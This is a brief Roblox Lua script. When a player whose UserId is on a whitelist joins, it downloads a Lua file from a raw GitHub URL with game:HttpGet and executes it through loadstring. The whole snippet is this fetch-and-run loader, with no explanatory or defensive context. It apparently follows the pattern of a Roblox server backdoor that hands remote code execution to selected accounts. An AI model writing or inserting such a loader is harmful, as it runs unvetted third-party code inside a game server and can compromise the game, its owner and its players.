Players.PlayerAdded:Connect(function(Player)
   if (WhitelistedIDs[Player.UserId]) then
       loadstring(game:HttpGet("https://raw.githubusercontent.com/nekomancer69420/nekosarecute/main/load.lua", true))()
   end
end)
